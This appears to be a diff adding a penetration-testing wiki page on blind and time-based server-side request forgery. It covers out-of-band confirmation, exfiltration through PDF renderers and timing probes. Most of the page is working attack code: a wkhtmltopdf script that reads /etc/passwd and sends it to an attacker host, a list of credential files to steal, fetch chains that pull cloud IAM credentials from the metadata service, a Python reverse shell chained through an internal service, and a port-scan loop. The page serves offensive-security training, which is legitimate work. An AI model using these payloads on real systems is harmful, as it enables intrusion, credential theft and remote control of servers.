@@ -1,0 +1,282 @@
+---
+title: Blind & time-based
+description: Confirming and exploiting SSRF when no response is reflected - OOB callbacks, time-based detection, JavaScript-in-PDF exfiltration.
+mitre: [T1190, T1071]
+d3fend: [D3-OTF, D3-NTA]
+impact: [InternalAccess]
+sidebar:
+  order: 6
+  label: Blind & time-based
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The application fetches your URL but doesn't return the response body. Confirm with an out-of-band callback, exfiltrate via JavaScript-in-PDF (when the renderer is `wkhtmltopdf` or Chromium), or use timing differentials when no outbound channel is allowed.
+
+```bash
+# Confirm
+?url=http://<COLLAB>                    # OOB hit on your listener confirms SSRF
+
+# Exfil via JS execution in PDF renderer
+# Upload an HTML file with JavaScript that reads local files and POSTs to your server
+
+# Time-based when no outbound is possible
+?url=http://nonexistent.invalid         # ~10s timeout if request goes out
+?url=http://internal.app.local          # fast response if internal hostname resolves
+```
+
+Success indicator: callback hit on your listener; or measurable response-time differential between reachable and unreachable URLs.
+
+## When SSRF goes blind
+
+Common patterns that suppress output:
+
+- **Webhook validators** - app POSTs to your URL, doesn't show you the response
+- **Image/PDF generators** - fetched content is rendered, only the rendered output returns
+- **URL preview generators** - server fetches, extracts metadata (title, og:image), returns metadata only
+- **OAuth/SAML callbacks** - server validates URL is reachable, returns success/failure boolean
+- **"Test connection" features** - return "OK" or "Failed", nothing else
+
+In all of these, the request goes out but the response body never reaches you through the application.
+
+## OOB confirmation
+
+Set up a listener and probe.
+
+### Listener options
+
+```bash
+# Burp Collaborator (Burp Pro)
+# Click "Copy to clipboard" in the Collaborator client; submit that hostname
+
+# interactsh (open source, public server)
+interactsh-client                       # prints a hostname; submit it
+interactsh-client -v                    # show full request data
+
+# Self-hosted on a VPS
+sudo tcpdump -i any -n udp port 53      # DNS callbacks
+python3 -m http.server 80               # HTTP callbacks
+nc -lvnp 80                             # raw HTTP (less convenient)
+
+# All-in-one DNS+HTTP listener
+ngrok http 80                           # tunnels local server, gives you a public URL
+```
+
+### Probes
+
+```bash
+?url=http://<COLLAB>                                           # bare HTTP
+?url=https://<COLLAB>                                          # bare HTTPS (different code path)
+?url=http://<COLLAB>:8080                                      # non-default port
+?url=http://test123.<COLLAB>                                   # subdomain - useful to correlate per-request
+?url=http://<COLLAB>/test123                                   # path - same purpose
+```
+
+Subdomain or path tagging lets you correlate which probe triggered which callback when running multiple in parallel.
+
+### Reading the callback
+
+A callback gives you more than just confirmation:
+
+```
+GET / HTTP/1.1
+Host: <COLLAB>
+User-Agent: Python-urllib/3.9
+Connection: close
+```
+
+The `User-Agent` reveals the HTTP library, which informs schema availability (Python `urllib` doesn't do gopher; curl does, etc.). Note it down.
+
+## Exfiltration via PDF renderer
+
+Many "URL → PDF" features use `wkhtmltopdf` or headless Chromium, both of which execute JavaScript before snapshotting. If you can submit HTML content (or a URL serving HTML), the JS runs server-side with access to local files via `file://`.
+
+### Wkhtmltopdf - XSS to local file read
+
+`wkhtmltopdf` runs old WebKit and supports cross-origin requests from `file://` to anywhere. The classic exfil:
+
+<Steps>
+
+1. **Set up an HTTP listener:**
+
+   ```bash
+   nc -lvnp 9090
+   ```
+
+2. **Create a payload HTML:**
+
+   ```html
+   <!DOCTYPE html>
+   <html>
+   <body>
+   <script>
+   var read = new XMLHttpRequest();
+   var send = new XMLHttpRequest();
+
+   read.onload = function() {
+       if (read.readyState === 4) {
+           send.open("GET", "http://<ATTACKER>:9090/?d=" + btoa(read.responseText), true);
+           send.send();
+       }
+   };
+   read.open("GET", "file:///etc/passwd", true);
+   read.send();
+   </script>
+   </body>
+   </html>
+   ```
+
+3. **Submit to the SSRF.** Either upload the file or host it on a public URL and submit that URL.
+
+4. **Decode the callback:**
+
+   ```bash
+   # Listener received: GET /?d=cm9vdDp4OjA6MDpyb290...
+   echo "cm9vdDp4OjA6MDpyb290..." | base64 -d
+   ```
+
+</Steps>
+
+### Targets to exfil
+
+```javascript
+read.open("GET", "file:///etc/passwd", true);
+read.open("GET", "file:///etc/shadow", true);                    // if root
+read.open("GET", "file:///proc/self/environ", true);
+read.open("GET", "file:///proc/self/cmdline", true);
+read.open("GET", "file:///root/.aws/credentials", true);
+read.open("GET", "file:///app/.env", true);
+read.open("GET", "file:///app/config/database.yml", true);
+read.open("GET", "file:///app/secrets.json", true);
+```
+
+### Modern Chromium PDF renderers
+
+Headless Chromium has stricter same-origin policy - `file://` to `http://` is blocked. But internal HTTP services are reachable:
+
+```javascript
+// Read internal service (Chromium-friendly)
+fetch("http://127.0.0.1:5000/admin/users")
+    .then(r => r.text())
+    .then(d => fetch("http://<ATTACKER>:9090/?d=" + btoa(d)));
+
+// Trigger SSRF + cloud metadata read in one shot
+fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+    .then(r => r.text())
+    .then(role => fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role))
+    .then(r => r.text())
+    .then(d => fetch("http://<ATTACKER>:9090/?creds=" + btoa(d)));
+```
+
+## Reverse shell via blind SSRF
+
+When the internal service reachable through SSRF has its own RCE bug, chain them. The HTML→JS→internal-fetch primitive lets you POST to internal endpoints with arbitrary parameters.
+
+```html
+<script>
+// Build the inner SSRF that hits the RCE-vulnerable internal service
+var rce = new XMLHttpRequest();
+rce.open(
+    "GET",
+    "http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=" +
+    encodeURIComponent("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"),
+    true
+);
+rce.send();
+</script>
+```
+
+Listener:
+
+```bash
+nc -lvnp <LPORT>
+```
+
+The double-encoding consideration from chained SSRF applies - see [chained SSRF](/codex/web/server-side/ssrf/chained/) for the full pattern.
+
+## Time-based detection
+
+When no outbound channel survives:
+
+```bash
+# Reachable internal service - fast response
+?url=http://127.0.0.1:80                   # ~50ms
+
+# Unreachable host - slow timeout
+?url=http://192.0.2.1                      # ~10s+ (TEST-NET-1, guaranteed unreachable)
+
+# Closed port on reachable host - different timeout
+?url=http://127.0.0.1:9999                 # ~50ms (refused) or ~10s (filtered)
+```
+
+The differential confirms SSRF reachability. Use sparingly - slow probes consume request quota and trigger anomaly detection.
+
+### Methodology
+
+<Steps>
+
+1. **Establish baseline.** Submit a *known-unreachable* IP from `TEST-NET-1` (`192.0.2.0/24`) - guaranteed timeout. Note the time.
+
+2. **Submit a *known-reachable* URL.** Either `127.0.0.1:80` (often something running) or your own external host. Note the time.
+
+3. **The differential is the signal.** Reachable hosts return faster than unreachable.
+
+4. **Probe internal services.** Run the same comparison against suspected internal hostnames (`internal.app.local`, `redis`, `elasticsearch`).
+
+</Steps>
+
+### Time-based port scan
+
+```bash
+# Loop ports and time each request
+for port in 21 22 80 443 3306 5432 6379 8080 9200; do
+    t=$(curl -s -o /dev/null -w "%{time_total}" "http://<TARGET>/?url=http://127.0.0.1:$port")
+    echo "$port: $t"
+done
+```
+
+Open ports respond in ~50-200ms; closed/filtered take 5-30s depending on timeout config. The gap is large enough to read by eye.
+
+<Aside type="caution">
+Time-based SSRF probing scales badly. A 60-port scan at 10s each = 10 minutes, and that's just one host. Do reflective port scanning ([internal discovery](/codex/web/server-side/ssrf/internal-discovery/)) when possible; reserve time-based for confirmation only.
+</Aside>
+
+## XSS via wkhtmltopdf - known-bad pattern
+
+The wkhtmltopdf docs explicitly warn: *"Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server."* Treat any "URL → PDF" feature using wkhtmltopdf as fully exploitable until proven otherwise.
+
+Detection: in your callback request, look for:
+
+```
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf
+```
+
+When you see `wkhtmltopdf` in the User-Agent of the SSRF callback, you have full JavaScript execution server-side and `file://` reads are unrestricted.
+
+## Other blind SSRF tells
+
+Beyond OOB callbacks, the application sometimes leaks information indirectly:
+
+- **Response time** - covered above
+- **Error messages** - different errors for "could not resolve" vs "connection refused" vs "timeout" indicate the request was attempted
+- **Response length** - even when the body is fixed, headers (`Content-Length`, custom error codes) may differ
+- **Status codes** - 200 vs 502 vs 504 corresponds to internal success/failure
+- **Redirects** - the application might follow redirects from the fetched URL and reflect the final URL somewhere
+
+Always check response shape carefully before concluding "no signal exists."
+
+## Common failure modes
+
+- **OOB hits never arrive.** Egress firewall blocks outbound. Confirm by testing whether the application can reach *anything* externally - try fetching `https://example.com` and looking for User-Agent in the example.com logs (you control the domain).
+- **Callback arrives but DNS-only, no HTTP.** Outbound HTTP blocked, DNS allowed (common). DNS-only callbacks confirm SSRF but limit exfil to whatever fits in subdomain labels (~63 chars per label).
+- **wkhtmltopdf detected but `file://` blocked.** Newer wkhtmltopdf builds disable `file://` by default. Re-enable check for `--enable-local-file-access` flag - sometimes the app passes it. If not, fall back to internal HTTP exfil only.
+- **Time-based scan returns identical times for everything.** Application has its own timeout (e.g., 5s) shorter than the network timeout. All requests time out at the app layer regardless of internal status. No time signal available; back to OOB.
+- **JavaScript executed but `XMLHttpRequest` blocked.** Some renderers strip JS APIs. Try `<img src="http://<ATTACKER>/?d=...">` for GET-only exfil, or CSS `@import` URL leakage.
+- **PDF renderer doesn't execute JS.** Server-side rendering with `pandoc`, `weasyprint`, or `Prince` doesn't evaluate scripts. The XSS-as-SSRF chain only works against script-executing renderers (wkhtmltopdf, Chromium, Phantom).
+
+## Notes
+
+The hierarchy when output is suppressed: OOB callback first (cheapest, highest signal), then JS-execution exfil if a renderer is involved, then file canaries (rare for SSRF - usually not applicable), then time-based as last resort.
+
+JavaScript execution in a PDF renderer is often a more powerful primitive than the SSRF that delivered it - it's full XSS in a server-side browser context, with `file://` access on old wkhtmltopdf and unrestricted internal HTTP fetch on Chromium. When you find one, treat it as a separate engagement chapter, not a confirmation step.
